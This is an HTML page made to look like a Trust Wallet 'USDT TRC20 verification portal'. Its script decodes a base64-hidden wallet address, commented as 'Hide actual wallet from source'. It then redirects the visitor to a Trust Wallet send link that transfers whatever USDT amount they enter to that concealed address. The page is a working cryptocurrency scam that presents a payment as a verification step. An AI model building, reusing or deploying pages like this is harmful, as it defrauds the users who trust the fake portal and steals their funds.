<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TRC20 USDT Verification</title>
  <link rel="icon" type="image/png" href="trc20-logo.png">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to right, #101820, #1a1f2b);
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px;
      text-align: center;
    }
    header {
      margin-top: 20px;
    }
    header img {
      width: 100px;
      height: auto;
      margin-bottom: 10px;
    }
    h1 {
      font-size: 26px;
      color: #00ffcc;
      margin-bottom: 10px;
    }
    p {
      font-size: 16px;
      opacity: 0.9;
    }
    .card {
      background: #181e2f;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,255,255,0.1);
      margin-top: 30px;
      max-width: 400px;
      width: 100%;
    }
    input[type="number"] {
      padding: 12px;
      font-size: 16px;
      border-radius: 10px;
      border: none;
      width: 80%;
      margin-top: 15px;
      text-align: center;
    }
    button {
      background: #00ffcc;
      color: #000;
      border: none;
      padding: 14px 24px;
      font-size: 16px;
      border-radius: 30px;
      cursor: pointer;
      margin-top: 20px;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #00ddb0;
    }
    .processing {
      display: none;
      margin-top: 20px;
      font-size: 15px;
      color: #ffa500;
    }
    footer {
      margin-top: 40px;
      font-size: 13px;
      opacity: 0.7;
    }
  </style>
</head>
<body>

  <header>
    <img src="trc20-logo.png" alt="TRC20 Logo">
    <h1>Verified by Trust Wallet</h1>
    <p>Secure USDT TRC20 verification portal</p>
  </header>

  <div class="card">
    <h2>Verify your USDT</h2>
    <p>Enter any amount to send via Trust Wallet</p>
    <input type="number" id="amount" placeholder="Enter USDT amount" />
    <button onclick="verifyUSDT()">Verify USDT</button>
    <div class="processing" id="processingText">Processing verification...</div>
  </div>

  <footer>
    Powered by TRC20 Payment Gateway
  </footer>

  <script>
    // Hide actual wallet from source
    const walletBase64 = "VEQ4S3FMU1lNaUU0eExYNFFWcnpYNFBScmpwQ2lzN3Z1Swo=";
    const walletAddress = atob(walletBase64).trim(); // decode hidden wallet

    function verifyUSDT() {
      const amount = document.getElementById("amount").value;
      if (!amount || parseFloat(amount) <= 0) {
        alert("Please enter a valid amount.");
        return;
      }

      document.getElementById("processingText").style.display = "block";
      setTimeout(() => {
        const url = `https://link.trustwallet.com/send?asset=c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&address=${walletAddress}&amount=${amount}`;
        window.location.href = url;
      }, 1500);
    }
  </script>

</body>
</html>
